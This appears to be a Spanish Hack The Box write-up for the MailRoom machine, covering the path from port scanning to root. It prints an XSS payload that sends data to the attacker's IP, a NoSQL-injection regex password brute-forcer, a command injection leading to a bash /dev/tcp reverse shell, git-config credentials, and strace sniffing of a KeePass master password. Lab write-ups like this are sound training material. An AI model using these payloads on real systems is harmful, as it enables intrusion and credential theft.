---
layout: post
title: MailRoom
date: 2023-08-21
description:
img:
fig-caption:
tags: []
---
___

<center><img src="/writeups/assets/img/Mailroom-htb/Mailroom.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos



***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.209 -oG openports
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-21 15:55 GMT
Nmap scan report for 10.10.11.209
Host is up (0.056s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 12.88 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nnmap -sCV -p22,80 10.10.11.209 -oN portscan
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-21 15:55 GMT
Nmap scan report for 10.10.11.209
Host is up (0.20s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 94:bb:2f:fc:ae:b9:b1:82:af:d7:89:81:1a:a7:6c:e5 (RSA)
|   256 82:1b:eb:75:8b:96:30:cf:94:6e:79:57:d9:dd:ec:a7 (ECDSA)
|_  256 19:fb:45:fe:b9:e4:27:5d:e5:bb:f3:54:97:dd:68:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: The Mail Room
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.36 seconds
```

## Puerto 80 (HTTP)

Con ```whatweb``` analizo las tecnologías que emplea el servidor web

```null
whatweb http://10.10.11.209
http://10.10.11.209 [200 OK] Apache[2.4.54], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.54 (Debian)], IP[10.10.11.209], PHP[7.4.33], Script, Title[The Mail Room], X-Powered-By[PHP/7.4.33]
```

<img src="/writeups/assets/img/Mailroom-htb/1.png" alt="">

Se expone un dominio al final de la página

<img src="/writeups/assets/img/Mailroom-htb/2.png" alt="">

Lo añado al ```/etc/hosts```. Encuentro un subdominio

```null
wfuzz -c -t 200 --hh=7746 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.mailroom.htb" http://mailroom.htb
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://mailroom.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000262:   200        267 L    1181 W     13089 Ch    "git"                                                                                                                                           

Total time: 0
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 0
```

Dentro hay un repositirio

<img src="/writeups/assets/img/Mailroom-htb/4.png" alt="">

Lo clono en mi equipo

```null
git clone http://git.mailroom.htb/matthew/staffroom
Cloning into 'staffroom'...
remote: Enumerating objects: 1209, done.
remote: Counting objects: 100% (1209/1209), done.
remote: Compressing objects: 100% (531/531), done.
remote: Total 1209 (delta 666), reused 1198 (delta 660), pack-reused 0
Receiving objects: 100% (1209/1209), 1.47 MiB | 1.02 MiB/s, done.
Resolving deltas: 100% (666/666), done.
```

En el ```auth.php``` se puede ver como se entabla una comunicacicación contra ```mongodb```

```null
$client = new MongoDB\Client("mongodb://mongodb:27017"); // Connect to the MongoDB database
```

Está implementado un sistema de verificación en dos pasos. Se puede ver un subdominio

```null
// Send an email to the user with the 2FA token
$to = $user['email'];
$subject = '2FA Token';
$message = 'Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token=' . $token;
mail($to, $subject, $message);
```

Lo añado al ```/etc/hosts``` y abro en el navegador, pero me devuelve un código de estado 403

<img src="/writeups/assets/img/Mailroom-htb/5.png" alt="">

Parece estar montada toda la web en ese sitio

La sección de contacto es vulnerable a XSS. Creo un script ```pwned.js``` que se encargue de traerme el contenido que ve la víctima tramitando una petición por GET a ese subdominio

<img src="/writeups/assets/img/Mailroom-htb/3.png" alt="">

```null
var req1 = new XMLHttpRequest();
req1.open('GET', 'http://staff-review-panel.mailroom.htb/index.php', false);
req1.send();

var req2 = new XMLHttpRequest();
req2.open('GET', 'http://10.10.16.34/?data=' + btoa(req1.responseText), false);
req2.send();
```

En el ```BurpSuite``` introduzco un simple payload con etiquetas ```<script>```

```null
email=test%40test.com&title=test&message=<script+src%3d"http%3a//10.10.16.15/pwned.js"></script>
```

Recibo la data en un servicio HTTP con ```python```

```null
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.209 - - [21/Aug/2023 16:01:14] "GET /pwned.js HTTP/1.1" 200 -
10.10.11.209 - - [21/Aug/2023 16:01:15] "GET /?data=CjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+Cgo8aGVhZD4KICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCIgLz4KICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iIC8+CiAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IiIgLz4KICA8bWV0YSBuYW1lPSJhdXRob3IiIGNvbnRlbnQ9IiIgLz4KICA8dGl0bGU+SW5xdWlyeSBSZXZpZXcgUGFuZWw8L3RpdGxlPgogIDwhLS0gRmF2aWNvbi0tPgogIDxsaW5rIHJlbD0iaWNvbiIgdHlwZT0iaW1hZ2UveC1pY29uIiBocmVmPSJhc3NldHMvZmF2aWNvbi5pY28iIC8+CiAgPCEtLSBCb290c3RyYXAgaWNvbnMtLT4KICA8bGluayBocmVmPSJmb250L2Jvb3RzdHJhcC1pY29ucy5jc3MiIHJlbD0ic3R5bGVzaGVldCIgLz4KICA8IS0tIENvcmUgdGhlbWUgQ1NTIChpbmNsdWRlcyBCb290c3RyYXApLS0+CiAgPGxpbmsgaHJlZj0iY3NzL3N0eWxlcy5jc3MiIHJlbD0ic3R5bGVzaGVldCIgLz4KPC9oZWFkPgoKPGJvZHk+CiAgPGRpdiBjbGFzcz0id3JhcHBlciBmYWRlSW5Eb3duIj4KICAgIDxkaXYgaWQ9ImZvcm1Db250ZW50Ij4KCiAgICAgIDwhLS0gTG9naW4gRm9ybSAtLT4KICAgICAgPGZvcm0gaWQ9J2xvZ2luLWZvcm0nIG1ldGhvZD0iUE9TVCI+CiAgICAgICAgPGgyPlBhbmVsIExvZ2luPC9oMj4KICAgICAgICA8aW5wdXQgcmVxdWlyZWQgdHlwZT0idGV4dCIgaWQ9ImVtYWlsIiBjbGFzcz0iZmFkZUluIHNlY29uZCIgbmFtZT0iZW1haWwiIHBsYWNlaG9sZGVyPSJFbWFpbCI+CiAgICAgICAgPGlucHV0IHJlcXVpcmVkIHR5cGU9InBhc3N3b3JkIiBpZD0icGFzc3dvcmQiIGNsYXNzPSJmYWRlSW4gdGhpcmQiIG5hbWU9InBhc3N3b3JkIiBwbGFjZWhvbGRlcj0iUGFzc3dvcmQiPgogICAgICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJmYWRlSW4gZm91cnRoIiB2YWx1ZT0iTG9nIEluIj4KICAgICAgICA8cCBoaWRkZW4gaWQ9Im1lc3NhZ2UiIHN0eWxlPSJjb2xvcjogIzhGOEY4RiI+T25seSBzaG93IHRoaXMgbGluZSBpZiByZXNwb25zZSAtIGVkaXQgY29kZTwvcD4KICAgICAgPC9mb3JtPgoKICAgICAgPCEtLSBSZW1pbmQgUGFzc293cmQgLS0+CiAgICAgIDxkaXYgaWQ9ImZvcm1Gb290ZXIiPgogICAgICAgIDxhIGNsYXNzPSJ1bmRlcmxpbmVIb3ZlciIgaHJlZj0icmVnaXN0ZXIuaHRtbCI+Q3JlYXRlIGFuIGFjY291bnQ8L2E+CiAgICAgIDwvZGl2PgoKICAgIDwvZGl2PgogIDwvZGl2PgoKICA8IS0tIEJvb3RzdHJhcCBjb3JlIEpTLS0+CiAgPHNjcmlwdCBzcmM9ImpzL2Jvb3RzdHJhcC5idW5kbGUubWluLmpzIj48L3NjcmlwdD4KCiAgPCEtLSBMb2dpbiBGb3JtLS0+CiAgPHNjcmlwdD4KICAgIC8vIEdldCB0aGUgZm9ybSBlbGVtZW50CiAgICBjb25zdCBmb3JtID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luLWZvcm0nKTsKCiAgICAvLyBBZGQgYSBzdWJtaXQgZXZlbnQgbGlzdGVuZXIgdG8gdGhlIGZvcm0KICAgIGZvcm0uYWRkRXZlbnRMaXN0ZW5lcignc3VibWl0JywgZXZlbnQgPT4gewogICAgICAvLyBQcmV2ZW50IHRoZSBkZWZhdWx0IGZvcm0gc3VibWlzc2lvbgogICAgICBldmVudC5wcmV2ZW50RGVmYXVsdCgpOwoKICAgICAgLy8gU2VuZCBhIFBPU1QgcmVxdWVzdCB0byB0aGUgbG9naW4ucGhwIHNjcmlwdAogICAgICBmZXRjaCgnL2F1dGgucGhwJywgewogICAgICAgIG1ldGhvZDogJ1BPU1QnLAogICAgICAgIGJvZHk6IG5ldyBVUkxTZWFyY2hQYXJhbXMobmV3IEZvcm1EYXRhKGZvcm0pKSwKICAgICAgICBoZWFkZXJzOiB7ICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJyB9CiAgICAgIH0pLnRoZW4ocmVzcG9uc2UgPT4gewogICAgICAgIHJldHVybiByZXNwb25zZS5qc29uKCk7CgogICAgICB9KS50aGVuKGRhdGEgPT4gewogICAgICAgIC8vIERpc3BsYXkgdGhlIG5hbWUgYW5kIG1lc3NhZ2UgaW4gdGhlIHBhZ2UKICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWVzc2FnZScpLnRleHRDb250ZW50ID0gZGF0YS5tZXNzYWdlOwogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXNzd29yZCcpLnZhbHVlID0gJyc7CiAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21lc3NhZ2UnKS5yZW1vdmVBdHRyaWJ1dGUoImhpZGRlbiIpOwogICAgICB9KS5jYXRjaChlcnJvciA9PiB7CiAgICAgICAgLy8gRGlzcGxheSBhbiBlcnJvciBtZXNzYWdlCiAgICAgICAgLy9hbGVydCgnRXJyb3I6ICcgKyBlcnJvcik7CiAgICAgIH0pOwogICAgfSk7CiAgPC9zY3JpcHQ+CjwvYm9keT4KPC9odG1sPg== HTTP/1.1" 200 -
```

Le hago un decode e introduzco en un fichero ```index.html``` para verlo en el navegador

<img src="/writeups/assets/img/Mailroom-htb/6.png" alt="">

Si comparo con la del repositorio, creando allí un servicio HTTP con ```php -S 0.0.0.0:80```, puedo ver que es lo mismo

<img src="/writeups/assets/img/Mailroom-htb/7.png" alt="">

Sin embargo, está deshabilitado el poder crear nuevas cuentas

<img src="/writeups/assets/img/Mailroom-htb/8.png" alt="">

Había visto también como se tramita el usuario y la contraseña al servidor

```null
// Check if the email and password are correct
$user = $collection->findOne(['email' => $_POST['email'], 'password' => $_POST['password']]);
```

Modifico el ```pwned.js``` para que se autentique contra el ```auth.php```

```null
var req1 = new XMLHttpRequest();
req1.open('POST', 'http://staff-review-panel.mailroom.htb/auth.php', false);
req1.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
req1.send('email[$ne]=rubbx@rubbx.com&password[$ne]=rubbx');

var req2 = new XMLHttpRequest();
req2.open('GET', 'http://10.10.16.34/?data=' + btoa(req1.responseText), false);
req2.send();
```

Pruebo una ```NoSQLi``` a través del CSRF

```null
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.209 - - [21/Aug/2023 16:16:36] "GET /pwned.js HTTP/1.1" 200 -
10.10.11.209 - - [21/Aug/2023 16:16:37] "GET /?data=eyJzdWNjZXNzIjpmYWxzZSwibWVzc2FnZSI6IkludmFsaWQgaW5wdXQgZGV0ZWN0ZWQifXsic3VjY2VzcyI6dHJ1ZSwibWVzc2FnZSI6IkNoZWNrIHlvdXIgaW5ib3ggZm9yIGFuIGVtYWlsIHdpdGggeW91ciAyRkEgdG9rZW4ifQ== HTTP/1.1" 200 -
```

Es necesario un código de verificación en dos pasos

```null
echo eyJzdWNjZXNzIjpmYWxzZSwibWVzc2FnZSI6IkludmFsaWQgaW5wdXQgZGV0ZWN0ZWQifXsic3VjY2VzcyI6dHJ1ZSwibWVzc2FnZSI6IkNoZWNrIHlvdXIgaW5ib3ggZm9yIGFuIGVtYWlsIHdpdGggeW91ciAyRkEgdG9rZW4ifQ== | base64 -d | jq
{
  "success": false,
  "message": "Invalid input detected"
}
{
  "success": true,
  "message": "Check your inbox for an email with your 2FA token"
}
```

Puedo tratar de obtener crecenciales válidas con el uso de ```regex```. Como correo, utilizo ```tristan@mailroom.htb```, que es un usuario que aparece en la página principal


```null
var password = "";
var characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#%:;<>@_=';

for (var i = 0; i < characters.length; i++) {

    var req1 = new XMLHttpRequest();
    req1.open("POST", "http://staff-review-panel.mailroom.htb/auth.php", false);
    req1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    req1.send("email=tristan@mailroom.htb&password[$regex]=" + password + characters[i] + ".*");

    if (req1.responseText.length == 130) {
        password += characters[i];
        var req2 = new XMLHttpRequest();
        req2.open("GET", "http://10.10.16.34/?pass=" + password, true);
        req2.send();
        i = 0;
    }
}

var req3 = new XMLHttpRequest();
req3.open("GET", "http://10.10.16.34/?done=" + password, true);
req3.send();
```

Obtengo la contraseña

```null
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.209 - - [21/Aug/2023 16:44:42] "GET /pwned.js HTTP/1.1" 200 -
10.10.11.209 - - [21/Aug/2023 16:44:57] "GET /?done=69trisRulez! HTTP/1.1" 200 -
```

Gano acceso por SSH. Puedo ver la primera flag

```null
sh tristan@10.10.11.209
The authenticity of host '10.10.11.209 (10.10.11.209)' can't be established.
ED25519 key fingerprint is SHA256:c4alO/6TY4cZRWE6/Mr+rsUQ3AXFKUZDWmSifHVp9pQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.209' (ED25519) to the list of known hosts.
tristan@10.10.11.209's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-146-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 2.0


 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


You have mail.
Last login: Mon Aug 21 16:26:30 2023 from 10.10.16.54
tristan@mailroom:~$ 
```

Puedo ver un correo para este usuario

```null
Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token=d60f9deffd137466d18dd3bd2f991c77
From noreply@mailroom.htb  Mon Aug 21 17:16:56 2023
Return-Path: <noreply@mailroom.htb>
X-Original-To: tristan@mailroom.htb
Delivered-To: tristan@mailroom.htb
Received: from localhost (unknown [172.19.0.5])
	by mailroom.localdomain (Postfix) with SMTP id CD7E0D47
	for <tristan@mailroom.htb>; Mon, 21 Aug 2023 17:16:56 +0000 (UTC)
Subject: 2FA
```

Se comparte un token para el subdominio de antes. Para poder acceder a este, configuro un ```Dinamic Port Forwarding``` con ```ssh```. Para ello, entro en el modo commandline haciendo dos tab en la tecla enter e introduciendo ```~C```. Después indico el puerto al que me quiero conectar en mi equipo

```null
ssh> -D 1080
Forwarding port.
```

Añado en el ```/etc/hosts``` este dominio ```staff-review-panel.mailroom.htb``` apuntando a mi equipo. Con extensiones como ```FoxyProxy``` puedo configurar en ```Firefox``` el SOCKS5 para llegar a este. Al introducir la URL del mail debería haber ver lo siguiente:

<img src="/writeups/assets/img/Mailroom-htb/9.png" alt="">

Reviso el código en el ```git```. En el archivo ```inspect.php``` se puede inyectar comandos a través del parámetro por POST ```inquiry_id```

```null
if (isset($_POST['inquiry_id'])) {
  $inquiryId = preg_replace('/[\$<>;|&{}\(\)\[\]\'\"]/', '', $_POST['inquiry_id']);
  $contents = shell_exec("cat /var/www/mailroom/inquiries/$inquiryId.html")
```

Creo un archivo ```index.html``` que se encargue de enviarme una reverse shell

```null
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.16.34/443 0>&1'
```

Inyecto el comando

<img src="/writeups/assets/img/Mailroom-htb/10.png" alt="">

<img src="/writeups/assets/img/Mailroom-htb/11.png" alt="">

Gano acceso en una sesión de ```netcat```

```null
 nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.34] from (UNKNOWN) [10.10.11.209] 53320
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@c3beddd84e6e:/var/www/staffroom$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@c3beddd84e6e:/var/www/staffroom$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
www-data@c3beddd84e6e:/var/www/staffroom$ export TERM=xterm-color
www-data@c3beddd84e6e:/var/www/staffroom$ export SHELL=bash
www-data@c3beddd84e6e:/var/www/staffroom$ stty rows 55 columns 209
www-data@c3beddd84e6e:/var/www/staffroom$ source /etc/skel/.bashrc 
```

Estoy dentro de un contenedor

```null
www-data@c3beddd84e6e:/var/www/staffroom$ hostname -I
172.19.0.5 
```

En la configuración del ```git``` se pueden ver credenciales para el usuario ```matthew```

```null
www-data@c3beddd84e6e:/var/www/staffroom/.git$ cat config 
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://matthew:HueLover83%23@gitea:3000/matthew/staffroom.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
[user]
	email = matthew@mailroom.htb
www-data@c3beddd84e6e:/var/www/staffroom
```

Hay que tener en cuenta que ```%23``` es ```#``` en urlencode. Puedo ver la primera flag

```null
tristan@mailroom:/tmp$ su matthew
Password: 
matthew@mailroom:/tmp$ cd
matthew@mailroom:~$ cat user.txt 
0508cfca6026b147bed4d88192cd924a
```

# Escalada

Este usuario tiene una base de datos de keepass en su directorio personal

```null
matthew@mailroom:~$ ls
personal.kdbx  personal.kdbx.lock  user.txt
```

Se está ejecutando ```keepasscli```. Al estarse ejecutando continuamente, el ```pid``` se modifica con el tiempo

```null
matthew@mailroom:~$ ps -ef
UID          PID    PPID  C STIME TTY          TIME CMD
matthew    48989   48988  0 17:36 pts/3    00:00:00 bash
matthew    50316       1  0 17:47 ?        00:00:00 /lib/systemd/systemd --user
matthew    50322   50314  1 17:47 ?        00:00:00 /usr/bin/perl /usr/bin/kpcli
matthew    50333   48989  0 17:47 pts/3    00:00:00 ps -ef
```

El ```ptrace``` está deshabilitado

```null
matthew@mailroom:~$ cat /proc/sys/kernel/yama/ptrace_scope 
0
```

Con ```strace``` puedo sniffear datos

```null
matthew@mailroom:~$ strace -p $(pidof perl) > /tmp/sniffing
```

Creo un bucle para capturar datos

```null
matthew@mailroom:/tmp$ while true; do strace -p $(pidof perl) -o sniffing; done
```

Al filtrar por ```write```, que corresponde a datos introducidos por el usuario-

```null
matthew@mailroom:/tmp$ cat sniffing | grep write
write(4, "t", 1)                        = 1
write(4, "h", 1)                        = 1
write(4, "e", 1)                        = 1
write(4, "w", 1)                        = 1
write(4, "/", 1)                        = 1
write(4, "p", 1)                        = 1
write(4, "e", 1)                        = 1
write(4, "r", 1)                        = 1
write(4, "s", 1)                        = 1
write(4, "o", 1)                        = 1
write(4, "n", 1)                        = 1
write(4, "a", 1)                        = 1
write(4, "l", 1)                        = 1
write(4, ".", 1)                        = 1
write(4, "k", 1)                        = 1
write(4, "d", 1)                        = 1
write(4, "b", 1)                        = 1
write(4, "x", 1)                        = 1
write(4, "\n", 1)                       = 1
write(1, "Please provide the master passwo"..., 36) = 36
write(1, "*", 1)                        = 1
write(1, "*", 1)                        = 1
write(1, "*", 1)                        = 1
write(1, "*", 1)                        = 1
write(1, "*", 1)                        = 1
write(1, "*", 1)                        = 1
write(1, "*", 1)                        = 1
write(1, "*", 1)                        = 1
write(1, "*", 1)                        = 1
write(1, "*", 1)                        = 1
write(1, "*", 1)                        = 1
write(1, "*", 1)                        = 1
write(1, "*", 1)                        = 1
write(1, "*", 1)                        = 1
write(1, "\10 \10", 3)                  = 3
write(1, "*", 1)                        = 1
```

Si filtro por ```read```, puedo ver datos más privilegiados, entre los que se encuentra la master password 

```null
matthew@mailroom:~$ cat /tmp/sniffing  | grep -i read | tail -n 5
read(0, "4", 8192)                      = 1
read(0, 0x5593cdce0900, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x5593cdce0900, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x5593cdce0900, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "$", 8192)   
```

Para que sea más cómodo, utilizaré el parámetro ```-e``` en ```strace```

```null
matthew@mailroom:~$ while true; do strace -p $(pidof perl) -e read -o /tmp/sniffing; done
```

Obtengo la credencial

```null
matthew@mailroom:~$ cat /tmp/sniffing | grep -v EAGAIN | grep 'read(0'
read(0, "!", 8192)                      = 1
read(0, "s", 8192)                      = 1
read(0, "E", 8192)                      = 1
read(0, "c", 8192)                      = 1
read(0, "U", 8192)                      = 1
read(0, "r", 8192)                      = 1
read(0, "3", 8192)                      = 1
read(0, "p", 8192)                      = 1
read(0, "4", 8192)                      = 1
read(0, "$", 8192)                      = 1
read(0, "$", 8192)                      = 1
read(0, "w", 8192)                      = 1
read(0, "0", 8192)                      = 1
read(0, "1", 8192)                      = 1
read(0, "\10", 8192)                    = 1
read(0, "r", 8192)                      = 1
read(0, "d", 8192)                      = 1
read(0, "9", 8192)                      = 1
read(0, "\n", 8192)                     = 1
```

```null
matthew@mailroom:~$ cat /tmp/sniffing | grep -v EAGAIN | grep 'read(0' | grep -oP '".*?"' | tr -d "\n" | tr -d '"'; echo
!sEcUr3p4$$w01\10rd9\n
```

Hay que tener en cuenta que ```\n``` es un salto de línea y ```\10``` un retorno de carro en octal, por lo que no hay que tenerlos en cuenta y la final sería ```!sEcUr3p4$$w0rd9```. Me conecto y obtengo la contraseña del usuario ```root```

```null
matthew@mailroom:~$ kpcli --kdb personal.kdbx 
Please provide the master password: *************************

KeePass CLI (kpcli) v3.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/> ls
=== Groups ===
Root/
kpcli:/> cd Root
kpcli:/Root> ls
=== Entries ===
0. food account                                            door.dash.local
1. GItea Admin account                                    git.mailroom.htb
2. gitea database password                                                
3. My Gitea Account                                       git.mailroom.htb
4. root acc                                                               
kpcli:/Root> show -f 4

Title: root acc
Uname: root
 Pass: a$gBa3!GA8
  URL: 
Notes: root account for sysadmin jobs
```

Puedo ver la segunda flag

```null
root@mailroom:/home/matthew# cat /root/root.txt 
1c2921f1524503b7fdcb618315a2be25
```